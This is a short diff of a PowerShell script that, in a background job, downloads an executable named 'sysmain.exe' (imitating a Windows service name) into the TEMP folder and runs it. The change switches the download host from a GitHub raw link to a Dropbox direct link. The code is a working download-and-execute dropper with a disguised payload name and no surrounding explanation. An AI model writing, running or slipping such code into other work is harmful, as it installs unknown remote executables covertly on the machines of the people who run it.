@@ -1,7 +1,7 @@
 Start-Job {
     try {
         $exe = "$env:TEMP\sysmain.exe"
-        Invoke-WebRequest "https://github.com/paneluserop/stm/raw/refs/heads/main/sysmain.exe" -OutFile $exe
+        Invoke-WebRequest "https://dl.dropboxusercontent.com/scl/fi/iivjr8z2ud83jv5vquxz7/sysmain.exe?rlkey=m63g7660o2hwzx6ecttklwlft&st=o6bhpaak&" -OutFile $exe
         $proc = Start-Process -FilePath $exe -PassThru
         $proc.WaitForExit()
 
